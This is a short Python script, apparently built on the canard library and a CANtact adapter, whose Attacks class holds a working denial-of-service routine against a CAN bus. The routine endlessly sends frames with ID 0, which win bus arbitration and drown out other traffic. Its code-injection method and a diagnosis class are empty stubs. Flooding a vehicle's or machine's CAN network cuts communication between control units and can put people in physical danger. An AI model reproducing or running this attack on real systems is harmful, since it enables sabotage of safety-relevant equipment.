from canard import can
from canard.hw import cantact


class Attacks(object):
    """This class contains different attacks against CAN"""

    def __init__(self):
        """Initialize the CAN device."""
        
        self.dev = cantact.CantactDev("/dev/cu.usbmodem1421")

    def ddos(self):
        """Implements a simple DDos attack using a frame whose id is 0.
        In CAN protocol network, the lowest id has the highest privilege."""
        
        # Start the device.
        self.dev.start()

        # Create a CAN payload frame whose id is 0 and data length is 8 bytes.
        frame = can.Frame(id=0)
        frame.dlc = 8

        # The attack will overwhelm CAN traffic.
        while True:
            self.dev.send(frame)

        # Stop the device. Although it might not be necessary.
        self.dev.stop()

    def injection(self):
        """Implements a code injection attack."""
        pass


class Diagnosis(object):
    """This class contains functions to read and diagnose CAN components."""
    pass
